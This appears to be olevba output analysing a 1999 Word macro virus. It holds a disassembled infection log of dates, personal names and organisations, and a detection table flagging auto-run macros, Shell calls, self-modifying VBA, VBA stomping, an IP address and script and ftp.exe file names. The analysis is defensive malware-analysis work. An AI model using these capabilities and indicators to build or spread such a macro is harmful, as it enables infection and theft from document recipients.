' Line #352:
' Line #353:
' Line #354:
' 	QuoteRem 0x0000 0x0022 " 02:04:06 PM - Monday, 22 Feb 1999"
' Line #355:
' 	QuoteRem 0x0000 0x000F " Sally Papworth"
' Line #356:
' 	QuoteRem 0x0000 0x0000 ""
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' 	QuoteRem 0x0000 0x0022 " 12:39:10 PM - Tuesday, 2 Mar 1999"
' Line #361:
' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
' Line #362:
' 	QuoteRem 0x0000 0x0000 ""
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' 	QuoteRem 0x0000 0x0022 " 06:58:41  - Wednesday, 3 Mar 1999"
' Line #367:
' 	QuoteRem 0x0000 0x000C " Sonja Mills"
' Line #368:
' 	QuoteRem 0x0000 0x0000 ""
' Line #369:
' Line #370:
' Line #371:
' Line #372:
' 	QuoteRem 0x0000 0x0023 " 12:02:55 PM - Tuesday, 16 Mar 1999"
' Line #373:
' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
' Line #374:
' 	QuoteRem 0x0000 0x0000 ""
' Line #375:
' Line #376:
' Line #377:
' Line #378:
' 	QuoteRem 0x0000 0x0025 " 04:44:14 PM - Wednesday, 24 Mar 1999"
' Line #379:
' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
' Line #380:
' 	QuoteRem 0x0000 0x0000 ""
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' 	QuoteRem 0x0000 0x0022 " 11:47:20 AM - Friday, 26 Mar 1999"
' Line #385:
' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
' Line #386:
' 	QuoteRem 0x0000 0x0000 ""
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' 	QuoteRem 0x0000 0x0023 " 07:42:40 PM - Tuesday, 20 Apr 1999"
' Line #391:
' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
' Line #392:
' 	QuoteRem 0x0000 0x0000 ""
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' 	QuoteRem 0x0000 0x0020 " 12:19:56  - Friday, 23 Apr 1999"
' Line #397:
' 	QuoteRem 0x0000 0x0004 " Phi"
' Line #398:
' 	QuoteRem 0x0000 0x0000 ""
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' 	QuoteRem 0x0000 0x0024 " 06:29:13 PM - Thursday, 29 Apr 1999"
' Line #403:
' 	QuoteRem 0x0000 0x0009 " Business"
' Line #404:
' 	QuoteRem 0x0000 0x0000 ""
' Line #405:
' Line #406:
' Line #407:
' Line #408:
' 	QuoteRem 0x0000 0x0021 " 10:21:23  - Tuesday, 18 May 1999"
' Line #409:
' 	QuoteRem 0x0000 0x001B " Building M Open Access Lab"
' Line #410:
' 	QuoteRem 0x0000 0x0000 ""
' Line #411:
' Line #412:
' Line #413:
' 	QuoteRem 0x0000 0x0036 "Peter Bowring Loves Nicky F. Also! 30/05/1999 13:26:29"
' Line #414:
' Line #415:
' Line #416:
' 	QuoteRem 0x0000 0x0032 "rdeane Loves Nicky F. Also! 11/06/1999 12:57:07 PM"
' Line #417:
' Line #418:
' Line #419:
' 	QuoteRem 0x0000 0x0033 "Pat Price Loves Nicky F. Also! 25-Jun-1999 12:28:05"
' Line #420:
' Line #421:
' Line #422:
' 	QuoteRem 0x0000 0x0034 "ldonnelly Loves Nicky F. Also! 12/07/1999 1:59:04 PM"
' Line #423:
' Line #424:
' Line #425:
' 	QuoteRem 0x0000 0x002E "SKM Loves Nicky F. Also! 19/7/1999 11:28:15 AM"
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' 	QuoteRem 0x0000 0x0023 " 11:59:03 AM - Tuesday, 27 Jul 1999"
' Line #430:
' 	QuoteRem 0x0000 0x0004 " DOT"
' Line #431:
' 	QuoteRem 0x0000 0x0000 ""
' Line #432:
' Line #433:
' Line #434:
' 	QuoteRem 0x0000 0x002F "DOT User Loves Nicky F. Also! 27/07/99 14:50:14"
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' 	QuoteRem 0x0000 0x001F " 10:40:29  - Friday, 6 Aug 1999"
' Line #439:
' 	QuoteRem 0x0000 0x0009 " DOT User"
' Line #440:
' 	QuoteRem 0x0000 0x0000 ""
' Line #441:
' Line #442:
' Line #443:
' 	QuoteRem 0x0000 0x0030 "DOT User Loves Nicky F. Also! 6/08/99 2:41:43 pm"
' Line #444:
' Line #445:
' Line #446:
' 	QuoteRem 0x0000 0x0030 "DOT User Loves Nicky F. Also! 8/9/99 11:28:32 AM"
' Line #447:
' Line #448:
' Line #449:
' 	QuoteRem 0x0000 0x0033 "David Enright Loves Nicky F. Also! 12/08/99 9:18:38"
' Line #450:
' Line #451:
' Line #452:
' 	QuoteRem 0x0000 0x0033 "David Enright Loves Nicky F. Also! 13/08/99 8:29:17"
' Line #453:
' Line #454:
' Line #455:
' 	QuoteRem 0x0000 0x002F "DOT User Loves Nicky F. Also! 27/08/99 10:19:36"
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' 	QuoteRem 0x0000 0x0020 " 03:05:45  - Friday, 27 Aug 1999"
' Line #460:
' 	QuoteRem 0x0000 0x0009 " DOT User"
' Line #461:
' 	QuoteRem 0x0000 0x0000 ""
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' 	QuoteRem 0x0000 0x0022 " 09:48:58 AM - Monday, 20 Sep 1999"
' Line #466:
' 	QuoteRem 0x0000 0x0009 " Ditry PC"
' Line #467:
' 	QuoteRem 0x0000 0x0000 ""
' Line #468:
' Line #469:
' Line #470:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |happy.vbs           |Executable file name                         |
|IOC       |avm.vbs             |Executable file name                         |
|IOC       |A4.vbs              |Executable file name                         |
|IOC       |a4.vbs              |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

